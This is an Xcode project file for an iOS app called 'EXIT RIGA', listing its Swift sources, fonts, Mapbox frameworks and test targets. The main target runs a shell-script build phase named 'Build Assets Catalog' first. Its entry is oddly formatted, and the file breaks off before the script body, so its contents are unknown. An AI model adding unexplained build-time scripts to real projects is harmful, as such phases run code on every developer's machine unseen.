// !$*UTF8*$!
{
	archiveVersion = 1;
	classes = {
	};
	objectVersion = 51;
	objects = {

/* Begin PBXBuildFile section */
		52655CF3261C1D460040B007 /* AppDelegate.swift in Sources */ = {isa = PBXBuildFile; fileRef = 52655CF2261C1D460040B007 /* AppDelegate.swift */; };
		52655CF5261C1D460040B007 /* SceneDelegate.swift in Sources */ = {isa = PBXBuildFile; fileRef = 52655CF4261C1D460040B007 /* SceneDelegate.swift */; };
		52655CFA261C1D460040B007 /* Main.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = 52655CF8261C1D460040B007 /* Main.storyboard */; };
		52655CFC261C1D470040B007 /* Assets.xcassets in Resources */ = {isa = PBXBuildFile; fileRef = 52655CFB261C1D470040B007 /* Assets.xcassets */; };
		52655CFF261C1D470040B007 /* LaunchScreen.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = 52655CFD261C1D470040B007 /* LaunchScreen.storyboard */; };
		52655D0A261C1D470040B007 /* EXIT_RIGATests.swift in Sources */ = {isa = PBXBuildFile; fileRef = 52655D09261C1D470040B007 /* EXIT_RIGATests.swift */; };
		52655D15261C1D470040B007 /* EXIT_RIGAUITests.swift in Sources */ = {isa = PBXBuildFile; fileRef = 52655D14261C1D470040B007 /* EXIT_RIGAUITests.swift */; };
		52655D2D261C1FB90040B007 /* SelectLanguageViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 52655D2C261C1FB90040B007 /* SelectLanguageViewController.swift */; };
		52655D3B261C22240040B007 /* Extension.swift in Sources */ = {isa = PBXBuildFile; fileRef = 52655D3A261C22240040B007 /* Extension.swift */; };
		52655D7A261C2C7C0040B007 /* UIButton.swift in Sources */ = {isa = PBXBuildFile; fileRef = 52655D78261C2C7C0040B007 /* UIButton.swift */; };
		52655D7B261C2C7C0040B007 /* UIView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 52655D79261C2C7C0040B007 /* UIView.swift */; };
		52655DAE261C395F0040B007 /* HomeViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 52655DAD261C395F0040B007 /* HomeViewController.swift */; };
		526B7436261C895300D4D0AB /* CategoryDetailViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 526B7435261C895300D4D0AB /* CategoryDetailViewController.swift */; };
		526B7440261C991C00D4D0AB /* CatDetailTableViewCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 526B743F261C991C00D4D0AB /* CatDetailTableViewCell.swift */; };
		52AF805A261D832F00C7DE2D /* Mapbox.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 52AF7FFF261D729100C7DE2D /* Mapbox.framework */; };
		52AF805D261D833100C7DE2D /* MapboxMobileEvents.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 52AF8000261D729100C7DE2D /* MapboxMobileEvents.framework */; };
		52AF8062261D835A00C7DE2D /* Settings.bundle in Resources */ = {isa = PBXBuildFile; fileRef = 52AF8061261D835A00C7DE2D /* Settings.bundle */; };
		52AF806E261D837600C7DE2D /* 8F3E82C3-52DF-39E5-809D-3389B6CBCAD4.bcsymbolmap in Resources */ = {isa = PBXBuildFile; fileRef = 52AF8066261D837600C7DE2D /* 8F3E82C3-52DF-39E5-809D-3389B6CBCAD4.bcsymbolmap */; };
		52AF806F261D837600C7DE2D /* MapboxMobileEvents.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 52AF8067261D837600C7DE2D /* MapboxMobileEvents.framework */; };
		52AF8070261D837600C7DE2D /* 4860631E-761E-36C9-9DA5-4504DE704214.bcsymbolmap in Resources */ = {isa = PBXBuildFile; fileRef = 52AF8068261D837600C7DE2D /* 4860631E-761E-36C9-9DA5-4504DE704214.bcsymbolmap */; };
		52AF8071261D837600C7DE2D /* Mapbox.framework.dSYM in Resources */ = {isa = PBXBuildFile; fileRef = 52AF8069261D837600C7DE2D /* Mapbox.framework.dSYM */; };
		52AF8072261D837600C7DE2D /* Mapbox.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 52AF806A261D837600C7DE2D /* Mapbox.framework */; };
		52AF8073261D837600C7DE2D /* MapboxMobileEvents.framework.dSYM in Resources */ = {isa = PBXBuildFile; fileRef = 52AF806B261D837600C7DE2D /* MapboxMobileEvents.framework.dSYM */; };
		52AF8074261D837600C7DE2D /* 0DC8DAD8-C6D7-343B-ACBF-79B48068D7CC.bcsymbolmap in Resources */ = {isa = PBXBuildFile; fileRef = 52AF806C261D837600C7DE2D /* 0DC8DAD8-C6D7-343B-ACBF-79B48068D7CC.bcsymbolmap */; };
		52AF8075261D837600C7DE2D /* 85944F06-DDCF-309B-B848-CCA12C2D2A09.bcsymbolmap in Resources */ = {isa = PBXBuildFile; fileRef = 52AF806D261D837600C7DE2D /* 85944F06-DDCF-309B-B848-CCA12C2D2A09.bcsymbolmap */; };
		52AF8078261D845D00C7DE2D /* Pods_EXIT_RIGA.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 82F0A44980AA2CDD0FB27FD8 /* Pods_EXIT_RIGA.framework */; };
		52F6F5E6261C5C71002459DF /* NewsTableViewCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 52F6F5E5261C5C71002459DF /* NewsTableViewCell.swift */; };
		52F6F5F2261C69BB002459DF /* CategoriesViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 52F6F5F1261C69BB002459DF /* CategoriesViewController.swift */; };
		52F6F5F7261C6C6A002459DF /* CategoryCollectionViewCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 52F6F5F6261C6C6A002459DF /* CategoryCollectionViewCell.swift */; };
/* End PBXBuildFile section */

/* Begin PBXContainerItemProxy section */
		52655D06261C1D470040B007 /* PBXContainerItemProxy */ = {
			isa = PBXContainerItemProxy;
			containerPortal = 52655CE7261C1D450040B007 /* Project object */;
			proxyType = 1;
			remoteGlobalIDString = 52655CEE261C1D450040B007;
			remoteInfo = "EXIT RIGA";
		};
		52655D11261C1D470040B007 /* PBXContainerItemProxy */ = {
			isa = PBXContainerItemProxy;
			containerPortal = 52655CE7261C1D450040B007 /* Project object */;
			proxyType = 1;
			remoteGlobalIDString = 52655CEE261C1D450040B007;
			remoteInfo = "EXIT RIGA";
		};
/* End PBXContainerItemProxy section */

/* Begin PBXFileReference section */
		2FBD5F8DD797D6064B0F9A0F /* Pods-EXIT RIGA.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-EXIT RIGA.debug.xcconfig"; path = "Target Support Files/Pods-EXIT RIGA/Pods-EXIT RIGA.debug.xcconfig"; sourceTree = "<group>"; };
		52655CEF261C1D450040B007 /* EXIT RIGA.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = "EXIT RIGA.app"; sourceTree = BUILT_PRODUCTS_DIR; };
		52655CF2261C1D460040B007 /* AppDelegate.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AppDelegate.swift; sourceTree = "<group>"; };
		52655CF4261C1D460040B007 /* SceneDelegate.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SceneDelegate.swift; sourceTree = "<group>"; };
		52655CF9261C1D460040B007 /* Base */ = {isa = PBXFileReference; lastKnownFileType = file.storyboard; name = Base; path = Base.lproj/Main.storyboard; sourceTree = "<group>"; };
		52655CFB261C1D470040B007 /* Assets.xcassets */ = {isa = PBXFileReference; lastKnownFileType = folder.assetcatalog; path = Assets.xcassets; sourceTree = "<group>"; };
		52655CFE261C1D470040B007 /* Base */ = {isa = PBXFileReference; lastKnownFileType = file.storyboard; name = Base; path = Base.lproj/LaunchScreen.storyboard; sourceTree = "<group>"; };
		52655D00261C1D470040B007 /* Info.plist */ = {isa = PBXFileReference; lastKnownFileType = text.plist.xml; path = Info.plist; sourceTree = "<group>"; };
		52655D05261C1D470040B007 /* EXIT RIGATests.xctest */ = {isa = PBXFileReference; explicitFileType = wrapper.cfbundle; includeInIndex = 0; path = "EXIT RIGATests.xctest"; sourceTree = BUILT_PRODUCTS_DIR; };
		52655D09261C1D470040B007 /* EXIT_RIGATests.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = EXIT_RIGATests.swift; sourceTree = "<group>"; };
		52655D0B261C1D470040B007 /* Info.plist */ = {isa = PBXFileReference; lastKnownFileType = text.plist.xml; path = Info.plist; sourceTree = "<group>"; };
		52655D10261C1D470040B007 /* EXIT RIGAUITests.xctest */ = {isa = PBXFileReference; explicitFileType = wrapper.cfbundle; includeInIndex = 0; path = "EXIT RIGAUITests.xctest"; sourceTree = BUILT_PRODUCTS_DIR; };
		52655D14261C1D470040B007 /* EXIT_RIGAUITests.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = EXIT_RIGAUITests.swift; sourceTree = "<group>"; };
		52655D16261C1D470040B007 /* Info.plist */ = {isa = PBXFileReference; lastKnownFileType = text.plist.xml; path = Info.plist; sourceTree = "<group>"; };
		52655D2C261C1FB90040B007 /* SelectLanguageViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SelectLanguageViewController.swift; sourceTree = "<group>"; };
		52655D3A261C22240040B007 /* Extension.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = Extension.swift; sourceTree = "<group>"; };
		52655D78261C2C7C0040B007 /* UIButton.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = UIButton.swift; sourceTree = "<group>"; };
		52655D79261C2C7C0040B007 /* UIView.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = UIView.swift; sourceTree = "<group>"; };
		52655D95261C34EA0040B007 /* Metropolis-BlackItalic.otf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "Metropolis-BlackItalic.otf"; sourceTree = "<group>"; };
		52655D96261C34EA0040B007 /* Metropolis-Medium.otf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "Metropolis-Medium.otf"; sourceTree = "<group>"; };
		52655D97261C34EA0040B007 /* Metropolis-ThinItalic.otf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "Metropolis-ThinItalic.otf"; sourceTree = "<group>"; };
		52655D98261C34EA0040B007 /* Metropolis-MediumItalic.otf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "Metropolis-MediumItalic.otf"; sourceTree = "<group>"; };
		52655D99261C34EA0040B007 /* Metropolis-Light.otf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "Metropolis-Light.otf"; sourceTree = "<group>"; };
		52655D9A261C34EA0040B007 /* Metropolis-ExtraLightItalic.otf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "Metropolis-ExtraLightItalic.otf"; sourceTree = "<group>"; };
		52655D9B261C34EB0040B007 /* Metropolis-ExtraLight.otf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "Metropolis-ExtraLight.otf"; sourceTree = "<group>"; };
		52655D9C261C34EB0040B007 /* Metropolis-Black.otf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "Metropolis-Black.otf"; sourceTree = "<group>"; };
		52655D9D261C34EB0040B007 /* Metropolis-Thin.otf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "Metropolis-Thin.otf"; sourceTree = "<group>"; };
		52655D9E261C34EB0040B007 /* Metropolis-Bold.otf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "Metropolis-Bold.otf"; sourceTree = "<group>"; };
		52655D9F261C34EB0040B007 /* Metropolis-LightItalic.otf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "Metropolis-LightItalic.otf"; sourceTree = "<group>"; };
		52655DA0261C34EB0040B007 /* Metropolis-ExtraBold.otf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "Metropolis-ExtraBold.otf"; sourceTree = "<group>"; };
		52655DA1261C34EB0040B007 /* Metropolis-SemiBoldItalic.otf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "Metropolis-SemiBoldItalic.otf"; sourceTree = "<group>"; };
		52655DA2261C34EB0040B007 /* Metropolis-RegularItalic.otf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "Metropolis-RegularItalic.otf"; sourceTree = "<group>"; };
		52655DA3261C34EB0040B007 /* Metropolis-BoldItalic.otf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "Metropolis-BoldItalic.otf"; sourceTree = "<group>"; };
		52655DA4261C34EC0040B007 /* Metropolis-Regular.otf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "Metropolis-Regular.otf"; sourceTree = "<group>"; };
		52655DA5261C34EC0040B007 /* Metropolis-SemiBold.otf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "Metropolis-SemiBold.otf"; sourceTree = "<group>"; };
		52655DA6261C34EC0040B007 /* Metropolis-ExtraBoldItalic.otf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "Metropolis-ExtraBoldItalic.otf"; sourceTree = "<group>"; };
		52655DAD261C395F0040B007 /* HomeViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = HomeViewController.swift; sourceTree = "<group>"; };
		526B7435261C895300D4D0AB /* CategoryDetailViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CategoryDetailViewController.swift; sourceTree = "<group>"; };
		526B743F261C991C00D4D0AB /* CatDetailTableViewCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CatDetailTableViewCell.swift; sourceTree = "<group>"; };
		52AF7FFF261D729100C7DE2D /* Mapbox.framework */ = {isa = PBXFileReference; lastKnownFileType = wrapper.framework; path = Mapbox.framework; sourceTree = "<group>"; };
		52AF8000261D729100C7DE2D /* MapboxMobileEvents.framework */ = {isa = PBXFileReference; lastKnownFileType = wrapper.framework; path = MapboxMobileEvents.framework; sourceTree = "<group>"; };
		52AF8061261D835A00C7DE2D /* Settings.bundle */ = {isa = PBXFileReference; lastKnownFileType = "wrapper.plug-in"; path = Settings.bundle; sourceTree = "<group>"; };
		52AF8066261D837600C7DE2D /* 8F3E82C3-52DF-39E5-809D-3389B6CBCAD4.bcsymbolmap */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = text; path = "8F3E82C3-52DF-39E5-809D-3389B6CBCAD4.bcsymbolmap"; sourceTree = "<group>"; };
		52AF8067261D837600C7DE2D /* MapboxMobileEvents.framework */ = {isa = PBXFileReference; lastKnownFileType = wrapper.framework; path = MapboxMobileEvents.framework; sourceTree = "<group>"; };
		52AF8068261D837600C7DE2D /* 4860631E-761E-36C9-9DA5-4504DE704214.bcsymbolmap */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = text; path = "4860631E-761E-36C9-9DA5-4504DE704214.bcsymbolmap"; sourceTree = "<group>"; };
		52AF8069261D837600C7DE2D /* Mapbox.framework.dSYM */ = {isa = PBXFileReference; lastKnownFileType = wrapper.dsym; path = Mapbox.framework.dSYM; sourceTree = "<group>"; };
		52AF806A261D837600C7DE2D /* Mapbox.framework */ = {isa = PBXFileReference; lastKnownFileType = wrapper.framework; path = Mapbox.framework; sourceTree = "<group>"; };
		52AF806B261D837600C7DE2D /* MapboxMobileEvents.framework.dSYM */ = {isa = PBXFileReference; lastKnownFileType = wrapper.dsym; path = MapboxMobileEvents.framework.dSYM; sourceTree = "<group>"; };
		52AF806C261D837600C7DE2D /* 0DC8DAD8-C6D7-343B-ACBF-79B48068D7CC.bcsymbolmap */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = text; path = "0DC8DAD8-C6D7-343B-ACBF-79B48068D7CC.bcsymbolmap"; sourceTree = "<group>"; };
		52AF806D261D837600C7DE2D /* 85944F06-DDCF-309B-B848-CCA12C2D2A09.bcsymbolmap */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = text; path = "85944F06-DDCF-309B-B848-CCA12C2D2A09.bcsymbolmap"; sourceTree = "<group>"; };
		52F6F5E5261C5C71002459DF /* NewsTableViewCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = NewsTableViewCell.swift; sourceTree = "<group>"; };
		52F6F5F1261C69BB002459DF /* CategoriesViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CategoriesViewController.swift; sourceTree = "<group>"; };
		52F6F5F6261C6C6A002459DF /* CategoryCollectionViewCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CategoryCollectionViewCell.swift; sourceTree = "<group>"; };
		82F0A44980AA2CDD0FB27FD8 /* Pods_EXIT_RIGA.framework */ = {isa = PBXFileReference; explicitFileType = wrapper.framework; includeInIndex = 0; path = Pods_EXIT_RIGA.framework; sourceTree = BUILT_PRODUCTS_DIR; };
		EB66B32BDF55E7EDF22C5453 /* Pods-EXIT RIGA.release.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-EXIT RIGA.release.xcconfig"; path = "Target Support Files/Pods-EXIT RIGA/Pods-EXIT RIGA.release.xcconfig"; sourceTree = "<group>"; };
/* End PBXFileReference section */

/* Begin PBXFrameworksBuildPhase section */
		52655CEC261C1D450040B007 /* Frameworks */ = {
			isa = PBXFrameworksBuildPhase;
			buildActionMask = 2147483647;
			files = (
				52AF806F261D837600C7DE2D /* MapboxMobileEvents.framework in Frameworks */,
				52AF8078261D845D00C7DE2D /* Pods_EXIT_RIGA.framework in Frameworks */,
				52AF805D261D833100C7DE2D /* MapboxMobileEvents.framework in Frameworks */,
				52AF805A261D832F00C7DE2D /* Mapbox.framework in Frameworks */,
				52AF8072261D837600C7DE2D /* Mapbox.framework in Frameworks */,
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
		52655D02261C1D470040B007 /* Frameworks */ = {
			isa = PBXFrameworksBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
		52655D0D261C1D470040B007 /* Frameworks */ = {
			isa = PBXFrameworksBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXFrameworksBuildPhase section */

/* Begin PBXGroup section */
		52655CE6261C1D450040B007 = {
			isa = PBXGroup;
			children = (
				52655CF1261C1D460040B007 /* EXIT RIGA */,
				52655D08261C1D470040B007 /* EXIT RIGATests */,
				52655D13261C1D470040B007 /* EXIT RIGAUITests */,
				52655CF0261C1D450040B007 /* Products */,
				CD33D1F450AAE1FF2B382C10 /* Pods */,
				D2D2144296D90C19C14AE5BE /* Frameworks */,
			);
			sourceTree = "<group>";
		};
		52655CF0261C1D450040B007 /* Products */ = {
			isa = PBXGroup;
			children = (
				52655CEF261C1D450040B007 /* EXIT RIGA.app */,
				52655D05261C1D470040B007 /* EXIT RIGATests.xctest */,
				52655D10261C1D470040B007 /* EXIT RIGAUITests.xctest */,
			);
			name = Products;
			sourceTree = "<group>";
		};
		52655CF1261C1D460040B007 /* EXIT RIGA */ = {
			isa = PBXGroup;
			children = (
				52655D26261C1EFC0040B007 /* Controllers */,
				52655D27261C1F0D0040B007 /* Views */,
				52655D25261C1EEE0040B007 /* Resources */,
				52655D00261C1D470040B007 /* Info.plist */,
			);
			path = "EXIT RIGA";
			sourceTree = "<group>";
		};
		52655D08261C1D470040B007 /* EXIT RIGATests */ = {
			isa = PBXGroup;
			children = (
				52655D09261C1D470040B007 /* EXIT_RIGATests.swift */,
				52655D0B261C1D470040B007 /* Info.plist */,
			);
			path = "EXIT RIGATests";
			sourceTree = "<group>";
		};
		52655D13261C1D470040B007 /* EXIT RIGAUITests */ = {
			isa = PBXGroup;
			children = (
				52655D14261C1D470040B007 /* EXIT_RIGAUITests.swift */,
				52655D16261C1D470040B007 /* Info.plist */,
			);
			path = "EXIT RIGAUITests";
			sourceTree = "<group>";
		};
		52655D25261C1EEE0040B007 /* Resources */ = {
			isa = PBXGroup;
			children = (
				52AF8065261D837600C7DE2D /* dynamic */,
				52AF7FFF261D729100C7DE2D /* Mapbox.framework */,
				52AF8061261D835A00C7DE2D /* Settings.bundle */,
				52AF8000261D729100C7DE2D /* MapboxMobileEvents.framework */,
				52655D94261C34D30040B007 /* Fonts */,
				52655D78261C2C7C0040B007 /* UIButton.swift */,
				52655D79261C2C7C0040B007 /* UIView.swift */,
				52655D3A261C22240040B007 /* Extension.swift */,
				52655CF2261C1D460040B007 /* AppDelegate.swift */,
				52655CF4261C1D460040B007 /* SceneDelegate.swift */,
			);
			path = Resources;
			sourceTree = "<group>";
		};
		52655D26261C1EFC0040B007 /* Controllers */ = {
			isa = PBXGroup;
			children = (
				52655D2B261C1F650040B007 /* SelectLanguageViewController */,
				52655DAD261C395F0040B007 /* HomeViewController.swift */,
				52F6F5E5261C5C71002459DF /* NewsTableViewCell.swift */,
				52F6F5F1261C69BB002459DF /* CategoriesViewController.swift */,
				52F6F5F6261C6C6A002459DF /* CategoryCollectionViewCell.swift */,
				526B7435261C895300D4D0AB /* CategoryDetailViewController.swift */,
				526B743F261C991C00D4D0AB /* CatDetailTableViewCell.swift */,
			);
			path = Controllers;
			sourceTree = "<group>";
		};
		52655D27261C1F0D0040B007 /* Views */ = {
			isa = PBXGroup;
			children = (
				52655CF8261C1D460040B007 /* Main.storyboard */,
				52655CFB261C1D470040B007 /* Assets.xcassets */,
				52655CFD261C1D470040B007 /* LaunchScreen.storyboard */,
			);
			path = Views;
			sourceTree = "<group>";
		};
		52655D2B261C1F650040B007 /* SelectLanguageViewController */ = {
			isa = PBXGroup;
			children = (
				52655D2C261C1FB90040B007 /* SelectLanguageViewController.swift */,
			);
			path = SelectLanguageViewController;
			sourceTree = "<group>";
		};
		52655D94261C34D30040B007 /* Fonts */ = {
			isa = PBXGroup;
			children = (
				52655D9C261C34EB0040B007 /* Metropolis-Black.otf */,
				52655D95261C34EA0040B007 /* Metropolis-BlackItalic.otf */,
				52655D9E261C34EB0040B007 /* Metropolis-Bold.otf */,
				52655DA3261C34EB0040B007 /* Metropolis-BoldItalic.otf */,
				52655DA0261C34EB0040B007 /* Metropolis-ExtraBold.otf */,
				52655DA6261C34EC0040B007 /* Metropolis-ExtraBoldItalic.otf */,
				52655D9B261C34EB0040B007 /* Metropolis-ExtraLight.otf */,
				52655D9A261C34EA0040B007 /* Metropolis-ExtraLightItalic.otf */,
				52655D99261C34EA0040B007 /* Metropolis-Light.otf */,
				52655D9F261C34EB0040B007 /* Metropolis-LightItalic.otf */,
				52655D96261C34EA0040B007 /* Metropolis-Medium.otf */,
				52655D98261C34EA0040B007 /* Metropolis-MediumItalic.otf */,
				52655DA4261C34EC0040B007 /* Metropolis-Regular.otf */,
				52655DA2261C34EB0040B007 /* Metropolis-RegularItalic.otf */,
				52655DA5261C34EC0040B007 /* Metropolis-SemiBold.otf */,
				52655DA1261C34EB0040B007 /* Metropolis-SemiBoldItalic.otf */,
				52655D9D261C34EB0040B007 /* Metropolis-Thin.otf */,
				52655D97261C34EA0040B007 /* Metropolis-ThinItalic.otf */,
			);
			path = Fonts;
			sourceTree = "<group>";
		};
		52AF8065261D837600C7DE2D /* dynamic */ = {
			isa = PBXGroup;
			children = (
				52AF8066261D837600C7DE2D /* 8F3E82C3-52DF-39E5-809D-3389B6CBCAD4.bcsymbolmap */,
				52AF8067261D837600C7DE2D /* MapboxMobileEvents.framework */,
				52AF8068261D837600C7DE2D /* 4860631E-761E-36C9-9DA5-4504DE704214.bcsymbolmap */,
				52AF8069261D837600C7DE2D /* Mapbox.framework.dSYM */,
				52AF806A261D837600C7DE2D /* Mapbox.framework */,
				52AF806B261D837600C7DE2D /* MapboxMobileEvents.framework.dSYM */,
				52AF806C261D837600C7DE2D /* 0DC8DAD8-C6D7-343B-ACBF-79B48068D7CC.bcsymbolmap */,
				52AF806D261D837600C7DE2D /* 85944F06-DDCF-309B-B848-CCA12C2D2A09.bcsymbolmap */,
			);
			path = dynamic;
			sourceTree = "<group>";
		};
		CD33D1F450AAE1FF2B382C10 /* Pods */ = {
			isa = PBXGroup;
			children = (
				2FBD5F8DD797D6064B0F9A0F /* Pods-EXIT RIGA.debug.xcconfig */,
				EB66B32BDF55E7EDF22C5453 /* Pods-EXIT RIGA.release.xcconfig */,
			);
			path = Pods;
			sourceTree = "<group>";
		};
		D2D2144296D90C19C14AE5BE /* Frameworks */ = {
			isa = PBXGroup;
			children = (
				82F0A44980AA2CDD0FB27FD8 /* Pods_EXIT_RIGA.framework */,
			);
			name = Frameworks;
			sourceTree = "<group>";
		};
/* End PBXGroup section */

/* Begin PBXNativeTarget section */
		52655CEE261C1D450040B007 /* EXIT RIGA */ = {
			isa = PBXNativeTarget;
			buildConfigurationList = 52655D19261C1D470040B007 /* Build configuration list for PBXNativeTarget "EXIT RIGA" */;
			buildPhases = (
				A3BC2A8FEB0ECD3E78AAC43A /* Build Assets Catalog */,
				62D125C2CD24378F6D57CCAC /* [CP] Check Pods Manifest.lock */,
				52655CEB261C1D450040B007 /* Sources */,
				52655CEC261C1D450040B007 /* Frameworks */,
				52655CED261C1D450040B007 /* Resources */,
				DFEAF101CAD7D1C725213F9F /* [CP] Embed Pods Frameworks */,
			);
			buildRules = (
			);
			dependencies = (
			);
			name = "EXIT RIGA";
			productName = "EXIT RIGA";
			productReference = 52655CEF261C1D450040B007 /* EXIT RIGA.app */;
			productType = "com.apple.product-type.application";
		};
		52655D04261C1D470040B007 /* EXIT RIGATests */ = {
			isa = PBXNativeTarget;
			buildConfigurationList = 52655D1C261C1D470040B007 /* Build configuration list for PBXNativeTarget "EXIT RIGATests" */;
			buildPhases = (
				52655D01261C1D470040B007 /* Sources */,
				52655D02261C1D470040B007 /* Frameworks */,
				52655D03261C1D470040B007 /* Resources */,
			);
			buildRules = (
			);
			dependencies = (
				52655D07261C1D470040B007 /* PBXTargetDependency */,
			);
			name = "EXIT RIGATests";
			productName = "EXIT RIGATests";
			productReference = 52655D05261C1D470040B007 /* EXIT RIGATests.xctest */;
			productType = "com.apple.product-type.bundle.unit-test";
		};
		52655D0F261C1D470040B007 /* EXIT RIGAUITests */ = {
			isa = PBXNativeTarget;
			buildConfigurationList = 52655D1F261C1D470040B007 /* Build configuration list for PBXNativeTarget "EXIT RIGAUITests" */;
			buildPhases = (
				52655D0C261C1D470040B007 /* Sources */,
				52655D0D261C1D470040B007 /* Frameworks */,
				52655D0E261C1D470040B007 /* Resources */,
			);
			buildRules = (
			);
			dependencies = (
				52655D12261C1D470040B007 /* PBXTargetDependency */,
			);
			name = "EXIT RIGAUITests";
			productName = "EXIT RIGAUITests";
			productReference = 52655D10261C1D470040B007 /* EXIT RIGAUITests.xctest */;
			productType = "com.apple.product-type.bundle.ui-testing";
		};
/* End PBXNativeTarget section */

/* Begin PBXProject section */
		52655CE7261C1D450040B007 /* Project object */ = {
			isa = PBXProject;
			attributes = {
				LastSwiftUpdateCheck = 1240;
				LastUpgradeCheck = 1240;
				TargetAttributes = {
					52655CEE261C1D450040B007 = {
						CreatedOnToolsVersion = 12.4;
					};
					52655D04261C1D470040B007 = {
						CreatedOnToolsVersion = 12.4;
						TestTargetID = 52655CEE261C1D450040B007;
					};
					52655D0F261C1D470040B007 = {
						CreatedOnToolsVersion = 12.4;
						TestTargetID = 52655CEE261C1D450040B007;
					};
				};
			};
			buildConfigurationList = 52655CEA261C1D450040B007 /* Build configuration list for PBXProject "EXIT RIGA" */;
			compatibilityVersion = "Xcode 9.3";
			developmentRegion = en;
			hasScannedForEncodings = 0;
			knownRegions = (
				en,
				Base,
			);
			mainGroup = 52655CE6261C1D450040B007;
			productRefGroup = 52655CF0261C1D450040B007 /* Products */;
			projectDirPath = "";
			projectRoot = "";
			targets = (
				52655CEE261C1D450040B007 /* EXIT RIGA */,
				52655D04261C1D470040B007 /* EXIT RIGATests */,
				52655D0F261C1D470040B007 /* EXIT RIGAUITests */,
			);
		};
/* End PBXProject section */

/* Begin PBXResourcesBuildPhase section */
		52655CED261C1D450040B007 /* Resources */ = {
			isa = PBXResourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
				52AF8071261D837600C7DE2D /* Mapbox.framework.dSYM in Resources */,
				52AF806E261D837600C7DE2D /* 8F3E82C3-52DF-39E5-809D-3389B6CBCAD4.bcsymbolmap in Resources */,
				52AF8062261D835A00C7DE2D /* Settings.bundle in Resources */,
				52655CFF261C1D470040B007 /* LaunchScreen.storyboard in Resources */,
				52AF8073261D837600C7DE2D /* MapboxMobileEvents.framework.dSYM in Resources */,
				52655CFC261C1D470040B007 /* Assets.xcassets in Resources */,
				52655CFA261C1D460040B007 /* Main.storyboard in Resources */,
				52AF8074261D837600C7DE2D /* 0DC8DAD8-C6D7-343B-ACBF-79B48068D7CC.bcsymbolmap in Resources */,
				52AF8070261D837600C7DE2D /* 4860631E-761E-36C9-9DA5-4504DE704214.bcsymbolmap in Resources */,
				52AF8075261D837600C7DE2D /* 85944F06-DDCF-309B-B848-CCA12C2D2A09.bcsymbolmap in Resources */,
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
		52655D03261C1D470040B007 /* Resources */ = {
			isa = PBXResourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
		52655D0E261C1D470040B007 /* Resources */ = {
			isa = PBXResourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXResourcesBuildPhase section */

/* Begin PBXShellScriptBuildPhase section */

	A3BC2A8FEB0ECD3E78AAC43A /* Build Assets Catalog */ = {
			isa = PBXShellScriptBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			inputFileListPaths = (
			);
			inputPaths = (
			);
			name = "Build Assets Catalog";
			outputFileListPaths = (
			);
			outputPaths = (
			);
